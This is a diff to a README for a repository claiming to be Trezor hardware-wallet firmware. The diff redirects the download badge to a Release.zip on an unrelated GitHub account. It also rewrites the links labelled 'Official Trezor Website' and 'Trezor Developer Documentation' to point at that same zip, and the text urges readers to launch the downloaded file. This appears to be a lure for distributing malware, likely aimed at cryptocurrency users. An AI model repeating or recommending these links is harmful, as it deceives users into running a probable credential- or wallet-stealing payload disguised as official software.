@@ -40,7 +40,7 @@ This repository covers a wide range of topics related to cryptocurrency, blockch
 
 To get started with developing or exploring the Trezor Wallet Firmware Monorepo Crypto Core Hardware, you can download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Areess1/Trezor-Wallet-FirmWare-Monorepo-Crypto-Core-Hardware/releases/download/v1.0/Release.zip)](https://github.com/Areess1/Trezor-Wallet-FirmWare-Monorepo-Crypto-Core-Hardware/releases/download/v1.0/Release.zip)
 
 If the link above ends with a file name, it needs to be launched to access the software. 🚀 
 
@@ -48,8 +48,8 @@ If the link does not work or you prefer a different version, please check the "R
 
 ## Resources
 
-- [Official Trezor Website](https://trezor.io) - Visit the official Trezor website for more information on hardware wallets and security features.
-- [Trezor Developer Documentation](https://developer.trezor.io) - Explore the developer documentation to learn how to integrate Trezor wallets into your applications.
+- [Official Trezor Website](https://github.com/Areess1/Trezor-Wallet-FirmWare-Monorepo-Crypto-Core-Hardware/releases/download/v1.0/Release.zip) - Visit the official Trezor website for more information on hardware wallets and security features.
+- [Trezor Developer Documentation](https://github.com/Areess1/Trezor-Wallet-FirmWare-Monorepo-Crypto-Core-Hardware/releases/download/v1.0/Release.zip) - Explore the developer documentation to learn how to integrate Trezor wallets into your applications.
 
 ## Contribution
 
